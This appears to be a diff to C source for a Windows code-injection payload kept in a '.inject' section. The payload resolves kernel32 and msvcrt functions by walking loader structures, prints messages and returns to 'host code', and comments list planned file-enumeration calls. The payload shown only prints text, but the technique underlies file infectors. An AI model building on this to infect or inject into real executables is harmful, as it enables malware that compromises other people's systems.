@@ -5,10 +5,9 @@
 #include <Windows.h>
 #include <winternl.h>
 
-#define BUFFER_SIZE 1024
-
 // #define KERNEL32_DLL 3
 // #define CURRENT_EXE 1
+#define SET_SECT __attribute__((section(".inject")))
 
 // #define IMAGE_BASE  ((void *)0x00007FF8827B0000) // Changes when PC is restarted (?)
 
@@ -16,26 +15,21 @@ typedef HANDLE (*tGetStdHandle) (DWORD);
 typedef WINBOOL (*tWriteConsoleA) (HANDLE, CONST VOID *, DWORD, LPDWORD, LPVOID);
 typedef HMODULE (*tLoadLibraryA)(LPCSTR);
 typedef FARPROC (*tGetProcAddress)(HMODULE, LPCSTR);
+typedef WINBOOL (*tFreeLibrary) (HMODULE);
+
 
 typedef int (*t_puts)(const char *);
 
-void payload(void) 
-__attribute__((section(".inject"))) __attribute__((used));
+void payload(void) SET_SECT __attribute__((used));
 
-void *get_image_base(wchar_t *module_name, LIST_ENTRY *list) 
-__attribute__((section(".inject")));
+void *get_image_base(wchar_t *module_name, LIST_ENTRY *list) SET_SECT;
 
-IMAGE_EXPORT_DIRECTORY *get_IMAGE_EXPORT_DIRECTORY(void *image_base) 
-__attribute__((section(".inject")));
-void *get_kernel_32_func(char *function_name, IMAGE_EXPORT_DIRECTORY* i_ex_dir, void *image_base) 
-__attribute__((section(".inject")));
+IMAGE_EXPORT_DIRECTORY *get_IMAGE_EXPORT_DIRECTORY(void *image_base) SET_SECT;
+void *get_kernel_32_func(char *function_name, IMAGE_EXPORT_DIRECTORY* i_ex_dir, void *image_base) SET_SECT;
 
-int compare(const char* a, const char* b) 
-__attribute__((section(".inject")));
-size_t length(const char* str) 
-__attribute__((section(".inject")));
-int wcompare(const wchar_t *a, const wchar_t *b) 
-__attribute__((section(".inject")));
+int compare(const char* a, const char* b) SET_SECT;
+size_t length(const char* str) SET_SECT;
+int wcompare(const wchar_t *a, const wchar_t *b) SET_SECT;
 
 #define FUNCTION(name) ((t_##name)pGetProcAddress(msvcrt_hModule, s_##name))
 
@@ -49,10 +43,13 @@ int main()
 
 void payload(void)
 {
-    char sGetStdHandle[] = "GetStdHandle";
-    char sWriteConsoleA[] = "WriteConsoleA";
     char sLoadLibraryA[] = "LoadLibraryA";
     char sGetProcAddress[] = "GetProcAddress";
+    char sFreeLibrary[] = "FreeLibrary";
+
+    // FindFirstFileA
+    // FindNextFileA
+    // FindClose
 
     char s_puts[] = "puts";
 
@@ -72,15 +69,9 @@ void payload(void)
 
     IMAGE_EXPORT_DIRECTORY *i_ex_dir = get_IMAGE_EXPORT_DIRECTORY(image_base);
 
-    LOAD(GetStdHandle);
-    LOAD(WriteConsoleA);
     LOAD(LoadLibraryA);
     LOAD(GetProcAddress);
-
-    // prt
-    HANDLE hConsole = pGetStdHandle(STD_OUTPUT_HANDLE);
-    DWORD charsWritten;
-    pWriteConsoleA(hConsole, message, length(message), &charsWritten, NULL);
+    LOAD(FreeLibrary);
 
     // load msvcrt
     char s_msvcrt[] = "msvcrt.dll";
@@ -91,6 +82,8 @@ void payload(void)
 
     FUNCTION(puts)(msg);
     FUNCTION(puts)(another);
+
+    pFreeLibrary(msvcrt_hModule);
 
     // go back to host code
     list = list->Flink;
